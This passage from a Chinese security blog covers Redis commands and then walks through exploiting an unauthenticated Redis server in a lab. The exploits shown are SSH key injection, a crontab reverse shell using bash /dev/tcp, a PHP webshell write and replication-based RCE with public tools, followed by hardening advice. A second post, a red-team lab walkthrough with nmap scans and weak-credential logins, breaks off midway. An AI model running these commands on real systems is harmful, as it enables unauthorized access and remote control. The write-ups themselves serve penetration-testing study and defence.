&quot;good&quot;</span><br><span class="line">2) &quot;bye&quot;</span><br></pre></td></tr></table></figure><p><strong>MGET key [key …]</strong></p><p>返回给定的一个或多个字符串键的值。</p><p>如果给定的字符串键里面， 有某个键不存在， 那么这个键的值将以特殊值 <code>nil</code> 表示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET redis redis.com</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SET mongodb mongodb.org</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb mysql     # 不存在的 mysql 返回 nil</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line">3) (nil)</span><br></pre></td></tr></table></figure><p><strong>DEL key</strong></p><p>删除key对应的键值数据。</p><h3 id="2-3-4-hash类型命令"><a href="#2-3-4-hash类型命令" class="headerlink" title="2.3.4 hash类型命令"></a>2.3.4 hash类型命令</h3><p>类似一个对象或者结构体。</p><p><strong>应用场景：</strong></p><p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p><p><strong>实现方式：</strong></p><p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p><p><strong>如图所示：</strong></p><p><img src="http://image.v0w.top/Blog/2020-08-09-123507.jpg"></p><p><strong>常用命令</strong></p><ul><li>hget hash field</li><li>hset hash field value</li><li>hgetall hash</li><li>hmset key field value [f v…]</li><li>HKEYS key</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; HSET 1 name &quot;V0WKeep3r&quot; brith 1998 age 22</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; Hget 1 name</span><br><span class="line">&quot;V0WKeep3r&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hgetall 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;brith&quot;</span><br><span class="line">4) &quot;1998&quot;</span><br><span class="line">5) &quot;age&quot;</span><br><span class="line">6) &quot;22&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hkeys 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;brith&quot;</span><br><span class="line">3) &quot;age&quot;</span><br></pre></td></tr></table></figure><h3 id="2-3-5-List类型命令"><a href="#2-3-5-List类型命令" class="headerlink" title="2.3.5 List类型命令"></a>2.3.5 List类型命令</h3><p><strong>LPUSH key value [value …] 插入元素创建列表</strong></p><p>将一个或多个值 <code>value</code> 插入到列表 <code>key</code> 的表头</p><p>如果有多个 <code>value</code> 值，那么各个 <code>value</code> 值按从左到右的顺序依次插入到表头： 比如说，对空列表 <code>mylist</code> 执行命令 <code>LPUSH mylist a b c</code> ，列表的值将是 <code>c b a</code> ，这等同于原子性地执行 <code>LPUSH mylist a</code> 、 <code>LPUSH mylist b</code> 和 <code>LPUSH mylist c</code> 三个命令。</p><p>如果 <code>key</code> 不存在，一个空列表会被创建并执行 LPUSH 操作。</p><p>当 <code>key</code> 存在但不是列表类型时，返回一个错误。</p><p><strong>RPUSH key value [value …] 向表尾插入元素</strong></p><p>不存在也会新建空列表。</p><p><strong>LPOP key 移除并返回列表头元素</strong></p><p><strong>RPOP key移除并返回列表尾元素</strong></p><p><strong>LSET key index value 设置列表元素</strong></p><p>将列表 <code>key</code> 下标为 <code>index</code> 的元素的值设置为 <code>value</code> 。当 <code>index</code> 参数超出范围，或对一个空列表( <code>key</code> 不存在)进行 LSET 时，返回一个错误。</p><p><strong>LLEN key 获取列表长度</strong></p><p><strong>LINDEX key index 通过索引获取列表元素</strong></p><p><strong>LRANGE key start stop 返回区间中的元素</strong></p><p>返回列表 <code>key</code> 中指定区间内的元素，区间以偏移量 <code>start</code> 和 <code>stop</code> 指定。</p><p>下标(index)参数 <code>start</code> 和 <code>stop</code> 都以 <code>0</code> 为底，也就是说，以 <code>0</code> 表示列表的第一个元素，以 <code>1</code> 表示列表的第二个元素，以此类推。</p><p>你也可以使用负数下标，以 <code>-1</code> 表示列表的最后一个元素， <code>-2</code> 表示列表的倒数第二个元素，以此类推。</p><p><strong>LINSERT key BEFORE|AFTER pivot value 插入元素</strong></p><p>将值 <code>value</code> 插入到列表 <code>key</code> 当中，位于值 <code>pivot</code> 之前或之后。</p><p>当 <code>pivot</code> 不存在于列表 <code>key</code> 时，不执行任何操作。</p><p>当 <code>key</code> 不存在时， <code>key</code> 被视为空列表，不执行任何操作。</p><p>如果 <code>key</code> 不是列表类型，返回一个错误。</p><p><strong>举例</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[4]&gt; Lpush list <span class="string">&quot;V0W&quot;</span> <span class="string">&quot;V0WKeep3r&quot;</span> <span class="string">&quot;noob&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Rpush list <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;noob&quot;</span></span><br><span class="line">2) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">3) <span class="string">&quot;V0W&quot;</span></span><br><span class="line">4) <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; LPOP list</span><br><span class="line"><span class="string">&quot;noob&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; RPOP list</span><br><span class="line"><span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Lset list 1 Great</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[4]&gt; LLen list</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; Lindex list 0</span><br><span class="line"><span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Linsert list after <span class="string">&quot;Great&quot;</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">2) <span class="string">&quot;Great&quot;</span></span><br><span class="line">3) <span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-6-Set类型命令"><a href="#2-3-6-Set类型命令" class="headerlink" title="2.3.6 Set类型命令"></a>2.3.6 Set类型命令</h3><p><strong>SADD key member [member …] 添加元素到集合</strong></p><p>将一个或多个 <code>member</code> 元素加入到集合 <code>key</code> 当中，已经存在于集合的 <code>member</code> 元素将被忽略。</p><p>假如 <code>key</code> 不存在，则创建一个只包含 <code>member</code> 元素作成员的集合。</p><p>当 <code>key</code> 不是集合类型时，返回一个错误。</p><p><strong>SPOP key 移除并返回集合中的一个随机元素</strong></p><p>**SREM key member [member …] **</p><p>移除集合 <code>key</code> 中的一个或多个 <code>member</code> 元素，不存在的 <code>member</code> 元素会被忽略。当 <code>key</code> 不是集合类型，返回一个错误。</p><p><strong>SMEMBERS key 返回集合中的所有成员</strong></p><p><strong>SINTER key [key …] 交集</strong></p><p>返回一个集合的全部成员，该集合是所有给定集合的交集。不存在的 <code>key</code> 被视为空集。当给定集合当中有一个空集时，结果也为空集(根据集合运算定律)。</p><p><strong>SUNION key [key …] 并集</strong></p><p><strong>SDIFF key [key …] 差集</strong></p><p><strong>举例</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; SADD students &quot;olivia&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;V0WKeep3r&quot; &quot;p0&quot; &quot;kingkk&quot; &quot;phithon&quot;</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Spop hackers 2</span><br><span class="line">1) &quot;kingkk&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SMembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; Srem hackers &quot;p0&quot;</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;p0&quot; &quot;kingkk&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Smembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;p0&quot;</span><br><span class="line">4) &quot;kingkk&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SUNION hackers students</span><br><span class="line">1) &quot;p0&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line">4) &quot;olivia&quot;</span><br><span class="line">5) &quot;phithon&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SINTER hackers students</span><br><span class="line">1) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SDIFF hackers students</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Redis-在渗透测试中的利用"><a href="#0x03-Redis-在渗透测试中的利用" class="headerlink" title="0x03 Redis 在渗透测试中的利用"></a>0x03 Redis 在渗透测试中的利用</h1><h2 id="3-1-Redis未授权访问"><a href="#3-1-Redis未授权访问" class="headerlink" title="3.1 Redis未授权访问"></a>3.1 Redis未授权访问</h2><p><strong>redis-4.0.10 之前的版本</strong>   Redis服务默认时没有密码验证的，而且默认将redis绑定到0.0.0.0:6379，部分DBA在配置时不注意，同时也没有采用添加防火墙等安全策略，将会导致Redis服务直接暴露到公网。</p><p>其他用户和攻击者可以在未授权的情况下，可以直接对redis进行访问，并进行操作。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-redis.png"></p><p><strong>redis-4.0.10 之后的版本</strong> 默认开启了保护模式，仅允许本地无密码验证连接。如果再想利用，可能就要考虑弱口令和配置错误了。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-040217.png"></p><p>Redis未授权漏洞常见的漏洞利用方式：</p><ul><li>Windows下，绝对路径写webshell 、写入启动项。</li><li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li></ul><h2 id="3-2-信息泄漏"><a href="#3-2-信息泄漏" class="headerlink" title="3.2 信息泄漏"></a>3.2 信息泄漏</h2><p>通过上述Redis命令来获取信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br></pre></td></tr></table></figure><h2 id="3-3-Redis-getshell"><a href="#3-3-Redis-getshell" class="headerlink" title="3.3 Redis getshell"></a>3.3 Redis getshell</h2><h3 id="3-3-1-利用Redis写公钥-进行ssh连接"><a href="#3-3-1-利用Redis写公钥-进行ssh连接" class="headerlink" title="3.3.1 利用Redis写公钥 进行ssh连接"></a>3.3.1 利用Redis写公钥 进行ssh连接</h3><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">#生成ssh公钥和私钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat redis_key.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"># 这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</span><br><span class="line"></span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | .&#x2F;redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set key </span><br><span class="line"># 将公钥写入redis，也可以通过连接redis再写，这里直接用管道写入了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"># 改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"># 存盘，就会将ssh公钥保存到&#x2F;root&#x2F;.ssh&#x2F;auuthorized_keys</span><br></pre></td></tr></table></figure><p> 将ssh公钥写入redis的键值</p><p><img src="http://image.v0w.top/Blog/2020-08-13-043354.png"></p><p>发现服务器已经被写入ssh公钥</p><p><img src="http://image.v0w.top/Blog/2020-08-13-042409.png" alt="服务器被写入ssh公钥"></p><p>通过ssh私钥连接到服务器，getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-035016.png" alt="通过ssh私钥连接到服务器"></p><h3 id="3-3-2-利用Redis-写-crontab任务反弹shell"><a href="#3-3-2-利用Redis-写-crontab任务反弹shell" class="headerlink" title="3.3.2 利用Redis 写 crontab任务反弹shell"></a>3.3.2 利用Redis 写 crontab任务反弹shell</h3><p>通过redis写键值，值由上一方法的ssh公钥变成crontable定时任务。定时任务的内容就是一个反弹shell的命令。然后保存到<code>/var/spool/cron/root</code></p><blockquote><p>/var/spool/cron/ 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set poc2 &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;23333 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>理论上，我们的数据应该像写ssh时一样，较为完好的保存，并每过一分钟执行。</p><p>事实上，我在测试此方法时，并没有成功，在任务写入/cron/root的过程中，似乎出现了错误，或者乱码。最终我的poc2，在/cron/root中的内容保存成这个样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos-7 cron]# crontab -l</span><br><span class="line">REDIS0007�redis-ver3.2.12�</span><br><span class="line">redis-bits�@�ctime�V�4_used-mem�f</span><br><span class="line">                                 ��poc2�8&#x3D;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 *�bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.9&#96;102&#x2F;23  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���e;�8L</span><br></pre></td></tr></table></figure><p>监听地址：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis服务：CentOS7 redis3.2.12  虚拟机</span><br><span class="line">攻击机： MACOS 10.15 </span><br><span class="line">VPS： 阿里云 ECS CentOS7</span><br></pre></td></tr></table></figure><p>暂时不知道是什么原因导致的==、</p><p>这一点很奇怪，困扰我很久==、</p><p>于是尝试使用另一个地址，使用攻击机监听，结果成了==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc4&gt;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.211.55.2&#x2F;23333 0&gt;&amp;1 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-13-070355.png"></p><h3 id="3-3-3-利用Redis-写webshell"><a href="#3-3-3-利用Redis-写webshell" class="headerlink" title="3.3.3 利用Redis 写webshell"></a>3.3.3 利用Redis 写webshell</h3><p>和前两个思路一样。</p><p>通过redis写键值，值变成一句话木马等。然后保存到<code>/var/www/html</code>或是其他web目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename redis_shell.php</span><br><span class="line">OK</span><br><span class="line">&gt; keys *</span><br><span class="line">1) &quot;hacker&quot;</span><br><span class="line">&gt; del hacker</span><br><span class="line">(integer) 1</span><br><span class="line">&gt; set shell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure><p>之后webshell文件就写入了web目录，就可以getshell了。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-073527.png"></p><h3 id="3-3-4-利用Redis主从复制getshell"><a href="#3-3-4-利用Redis主从复制getshell" class="headerlink" title="3.3.4 利用Redis主从复制getshell"></a>3.3.4 利用Redis主从复制getshell</h3><p>基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），这就使得它可以轻易实现以上任何一种漏洞利用方式，而且存在着更多的可能性，等待被探索。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件: Redis 4.x/5.x</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class="line"><span class="built_in">cd</span> redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-19-085343.png"></p><p><strong>Bypass师傅0rz 分析过该漏洞的原理：<a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></strong></p><h1 id="0x04-Redis安全防御"><a href="#0x04-Redis安全防御" class="headerlink" title="0x04 Redis安全防御"></a>0x04 Redis安全防御</h1><ol><li><p><strong>禁用高危命令</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 redis.conf 文件中直接将危险命令置空，或者改变其名字</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure></li><li><p><strong>以低权限运行 Redis 服务</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis默认使用用户权限启动的，降权可以避免getshell后直接root</span><br><span class="line">groupadd -r redis   </span><br><span class="line">useradd -r -g redis redis</span><br></pre></td></tr></table></figure></li><li><p><strong>为 Redis 添加密码验证</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件，添加</span><br><span class="line"></span><br><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure></li><li><p><strong>做好访问控制，在不需要接外网时，就bind本地。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件：</span><br><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><strong>修改默认端口</strong></p></li><li><p><strong>设置隐藏文件属性，不允许修改authorized_keys</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure></li><li><p><strong>设置防火墙策略，只允许特定IP连接</strong></p></li></ol><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><p><a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">Redis是什么？看这一篇就够了</a></p></li><li><p><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></p></li><li><p><a href="http://redisdoc.com/">http://redisdoc.com/</a></p></li><li><p><a href="http://redisguide.com/">http://redisguide.com/</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">k0rz3n-Redis 基础梳理以及其在渗透测试中的利用</a></p></li><li><p><a href="https://p0sec.net/index.php/archives/69/">p0-redis未授权访问漏洞利用总结</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Bypass-Redis主从复制getshell技巧</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> mysql </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</title>
      <link href="/2020/07/19/vulnstack1/"/>
      <url>/2020/07/19/vulnstack1/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今后，尽量每周抽时间对较为完整的一个渗透靶机进行练习，先从红日安全团队分享的靶机实战环境开始吧。感谢<strong>红日安全团队</strong>分享的靶机实战环境。红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。</p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p><p>本文的目的是为了记录和巩固知识点，并分享出来。</p><p>今天先从第一个开始。<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">ATT&amp;CK实战系列——红队实战（一）</a></p><p>闲话扯完了，冲！</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>红日安全团队提供的靶机都是虚拟机形式，需要对虚拟机网络进行一定的配置。关于VMware的几种网络模式的原理和区别，可以参考这篇文章——<a href="https://www.cnblogs.com/xuliangxing/p/7027124.html">VMware网络连接模式——桥接模式、NAT模式以及仅主机模式的介绍和区别</a> 介绍非常详细，通俗易懂。</p><p>我们下载完靶机有三个压缩包，对应三个虚拟机：</p><p><img src="http://image.v0w.top/Blog/20200719122321.png"></p><p>VM1为win7，VM2为winserver 2003即win2k3，VM3为winserver 2008，拓扑图为下图所示：</p><p><img src="http://image.v0w.top/Blog/20200719123222.png"></p><p>可以看到VM1是通外网的Web服务器，VM2和VM3是内网环境，与外网隔绝，只可以通过VM1进行访问。</p><p>一要营造一个内网环境（包括VM1，VM2，VM3），因此需要将虚拟机与外网隔绝，在VMware中可以通过虚拟机设置中的网络适配器来设置，设置成仅主机模式放到一个VMnet中即可实现三台主机在一个内网。</p><p>二要使得VM1能够访问外网，所以需要给VM1添加一个网卡，设置成NAT模式。</p><p>所以最终我给VM1(win7) 设置两个网卡，一个自定义连接到VMnet1(仅主机模式)，另一个连接模式为NAT，方便连接外网。VM2(winserver2k3)和VM3(winserver2008)</p><p><img src="http://image.v0w.top/Blog/image-202007191322.png"></p><p>最终呈现的结果如下（画了一个不专业的拓扑，大概能表达我的意思吧）：</p><p><img src="http://image.v0w.top/Blog/20200719133039.png"></p><p><img src="http://image.v0w.top/Blog/20200719134920.png"></p><h1 id="0x02-启动靶机和服务"><a href="#0x02-启动靶机和服务" class="headerlink" title="0x02 启动靶机和服务"></a>0x02 启动靶机和服务</h1><p>将三个靶机都启动，此时需要占用较大的内存，建议将其他应用关闭，另外电脑配置最好能在16G及以上。</p><p>密码都是 <code>hongrisec@2019</code>，可能会提醒你修改密码，修改后务必记住自己的密码。</p><p>进入win7 启动phpstudy。</p><p><img src="http://image.v0w.top/Blog/20200719135927.png"></p><p>发现三台主机都是固定IP的，是在<code>192.168.52.0/24段</code>可以通过三台主机之前进行ping测试，测试能通后，可以正式开始练习了。如果遇到NAT（比如主机和同网段的kali）ping不通win7的情况，试着关闭防火墙再试试。</p><img src="http://image.v0w.top/Blog/20200719140851.png" style="zoom: 80%;" /><h1 id="0x03-拿下Web服务器"><a href="#0x03-拿下Web服务器" class="headerlink" title="0x03 拿下Web服务器"></a>0x03 拿下Web服务器</h1><p>上述基本完成后，我们可以正式开始本次靶机渗透之旅，Now It’s pentest time.</p><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h2><p>本机kali的地址为：<code>192.168.237.137</code></p><p>搜索同段的主机，再针对性的使用nmap进行服务端口扫描：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.237.0&#x2F;24</span><br></pre></td></tr></table></figure><p>或者直接使用nmap扫描同一C段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.237.0&#x2F;24# -sP ping方式探测存活主机</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719152431.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn -p 1-65535 192.168.237.136# -sC默认脚本 -sV 服务版本 -p指定端口</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719153434.png" style="zoom:80%;" /><h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><p>发现80 端口开放，进行访问，是一个php探针页面，结合信息收集阶段得到phpstudy的信息，可以确定是一个phpstudy的集成环境。</p><p>网站的绝对路径：<code>C:/phpStudy/www/</code></p><p>此时，有两种攻击方案：</p><ol><li><a href="https://paper.seebug.org/1044/">phpstudy 后门</a></li><li>看看MySQL能不能连进去</li></ol><p>测试发现使用的版本恰好没有后门文件可以利用。尝试第二种方式，测试MySQL外连和登录密码。这里出题比较简单，直接是弱口令，<code>root/root</code>就可以连进去，而且是可以外连的。</p><p>使用dirmap或者御剑扫描web目录，发现<code>phpmyAdmin</code>和<code>beifen.rar</code>（如果是没有弱口令，从备份文件中找配置也是一个突破口）</p><img src="http://image.v0w.top/Blog/20200719160240.png" style="zoom:80%;" /><p>备份文件是一个yxcms的源码：</p><img src="http://image.v0w.top/Blog/20200719162406.png" style="zoom:80%;" /><p>在全文搜索admin之后，发现后台默认的用户名和密码：<code>admin/123456</code></p><p>发现后台地址：<code>/index.php?r=admin</code></p><img src="http://image.v0w.top/Blog/20200719163239.png" style="zoom:50%;" /><p>接下来，又有两种攻击方案可以选择：</p><ol><li><strong><a href="https://zhuanlan.zhihu.com/p/114184542">利用phpMyAdmin漏洞进行getshell或者利用MySQL写Shell</a></strong></li><li><strong>继续跟进yxcms</strong></li></ol><p>因为是练习嘛，我们都尝试一遍。</p><h3 id="3-2-1-mysql日志写shell"><a href="#3-2-1-mysql日志写shell" class="headerlink" title="3.2.1 mysql日志写shell"></a>3.2.1 mysql日志写shell</h3><p>先看一下有没有写权限：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719164102.png" style="zoom:50%;" /><p><code>secure_file_priv ==&#39;&#39;</code>为空说明有任意目录的写权限，非空则只能在对应目录读文件，这里的非空包括<code>NULL</code>。所以这里没有写权限，无法直接写shell。</p><p>因为在mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code>。并且无法用sql语句对其进行修改，只能够通过以下方式修改</p><p><strong>windows</strong>下:</p><p>修改<code>mysql.ini</code> 文件，在<code>[mysqld]</code> 下添加条目: 